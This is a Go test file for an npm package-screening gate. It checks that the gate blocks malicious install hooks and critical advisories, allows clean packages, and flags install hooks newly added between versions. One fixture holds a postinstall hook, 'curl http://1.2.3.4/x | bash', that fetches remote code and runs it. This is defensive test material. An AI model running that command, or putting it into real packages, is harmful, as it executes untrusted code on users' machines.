package gate

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/joncooper/detonator/internal/analyze/osv"
	"github.com/joncooper/detonator/internal/cache"
	"github.com/joncooper/detonator/internal/engine"
	"github.com/joncooper/detonator/internal/testutil"
	"github.com/joncooper/detonator/internal/verdict"
)

func testCache(t *testing.T) *cache.Cache {
	t.Helper()
	c, err := cache.New(t.TempDir(), time.Minute)
	if err != nil {
		t.Fatalf("cache.New: %v", err)
	}
	return c
}

func quietLog() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

// artForBytes stores bytes in the cache (so the differ can later find them) and
// returns the artifact identity, mimicking what the proxy does per request.
func admit(t *testing.T, p *Pipeline, c *cache.Cache, name, version string, data []byte) verdict.Verdict {
	t.Helper()
	digest, err := c.PutArtifact(data)
	if err != nil {
		t.Fatalf("PutArtifact: %v", err)
	}
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: name, Version: version, Digest: digest}
	v, err := p.Admit(context.Background(), art, data)
	if err != nil {
		t.Fatalf("Admit: %v", err)
	}
	return v
}

func TestPipelineBlocksMaliciousInstallHook(t *testing.T) {
	c := testCache(t)
	p := NewPipeline(PipelineOptions{Cache: c, Policy: engine.DefaultPolicy(), Logger: quietLog()})

	data := testutil.NPMTarball(map[string]string{
		"package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://1.2.3.4/x | bash"}}`,
	})
	v := admit(t, p, c, "evil", "1.0.0", data)
	if v.Decision != verdict.Block {
		t.Fatalf("want block, got %s (%s)", v.Decision, v.Reason)
	}
}

func TestPipelineAllowsBenign(t *testing.T) {
	c := testCache(t)
	p := NewPipeline(PipelineOptions{Cache: c, Policy: engine.DefaultPolicy(), Logger: quietLog()})

	data := testutil.NPMTarball(map[string]string{
		"package.json": `{"name":"good","version":"1.0.0"}`,
		"index.js":     `module.exports = 1;`,
	})
	v := admit(t, p, c, "good", "1.0.0", data)
	if v.Decision != verdict.Allow {
		t.Fatalf("want allow, got %s (%s): %+v", v.Decision, v.Reason, v.Signals)
	}
}

func TestPipelineBlocksOnOSVCritical(t *testing.T) {
	// Fake OSV that reports a critical vuln for any query.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"vulns": []map[string]any{{
				"id": "GHSA-test-crit", "summary": "remote code execution",
				"database_specific": map[string]any{"severity": "CRITICAL"},
			}},
		})
	}))
	defer srv.Close()

	c := testCache(t)
	p := NewPipeline(PipelineOptions{Cache: c, OSV: osv.New(srv.URL), Policy: engine.DefaultPolicy(), Logger: quietLog()})

	data := testutil.NPMTarball(map[string]string{"package.json": `{"name":"vuln","version":"1.0.0"}`})
	v := admit(t, p, c, "vuln", "1.0.0", data)
	if v.Decision != verdict.Block {
		t.Fatalf("want block on OSV critical, got %s (%s)", v.Decision, v.Reason)
	}
	if v.Signals[0].Rule != "GHSA-test-crit" {
		t.Fatalf("OSV signal missing/not top: %+v", v.Signals)
	}
}

func TestPipelineOSVUnavailableIsInfoNotBlock(t *testing.T) {
	c := testCache(t)
	// Point OSV at a closed port so the query errors.
	p := NewPipeline(PipelineOptions{Cache: c, OSV: osv.New("http://127.0.0.1:1"), Policy: engine.DefaultPolicy(), Logger: quietLog()})

	data := testutil.NPMTarball(map[string]string{"package.json": `{"name":"good","version":"1.0.0"}`})
	v := admit(t, p, c, "good", "1.0.0", data)
	if v.Decision != verdict.Allow {
		t.Fatalf("OSV outage should not block a clean package, got %s", v.Decision)
	}
}

// TestPipelineDiffFlagsNewInstallHook is the differ's headline case: a benign
// v1 followed by a v2 that adds a postinstall hook must surface as a diff
// signal and a populated diff summary.
func TestPipelineDiffFlagsNewInstallHook(t *testing.T) {
	c := testCache(t)
	p := NewPipeline(PipelineOptions{Cache: c, Policy: engine.DefaultPolicy(), Logger: quietLog()})

	v1data := testutil.NPMTarball(map[string]string{
		"package.json": `{"name":"lib","version":"1.0.0"}`,
		"index.js":     `module.exports = 1;`,
	})
	if v := admit(t, p, c, "lib", "1.0.0", v1data); v.Decision != verdict.Allow {
		t.Fatalf("v1 should be allowed, got %s", v.Decision)
	}

	v2data := testutil.NPMTarball(map[string]string{
		"package.json": `{"name":"lib","version":"1.1.0","scripts":{"postinstall":"node steal.js"}}`,
		"index.js":     `module.exports = 1;`,
		"steal.js":     `require('fs')`,
	})
	v2 := admit(t, p, c, "lib", "1.1.0", v2data)

	if v2.Diff == nil {
		t.Fatal("v2 verdict missing diff summary")
	}
	if v2.Diff.PrevVersion != "1.0.0" {
		t.Fatalf("diff prev version = %q want 1.0.0", v2.Diff.PrevVersion)
	}
	foundAdded := false
	for _, a := range v2.Diff.Added {
		if a == "steal.js" {
			foundAdded = true
		}
	}
	if !foundAdded {
		t.Fatalf("diff.Added missing steal.js: %+v", v2.Diff.Added)
	}
	var sawHookAdded bool
	for _, s := range v2.Signals {
		if s.Rule == "npm-install-hook-added" {
			sawHookAdded = true
		}
	}
	if !sawHookAdded {
		t.Fatalf("expected npm-install-hook-added diff signal: %+v", v2.Signals)
	}
	// The new hook ("node steal.js") isn't a shell/network danger token, so it
	// shouldn't hard-block; a new hook + review is the right call.
	if v2.Decision == verdict.Allow {
		t.Fatalf("v2 with a newly-added install hook should not be a silent allow")
	}
}
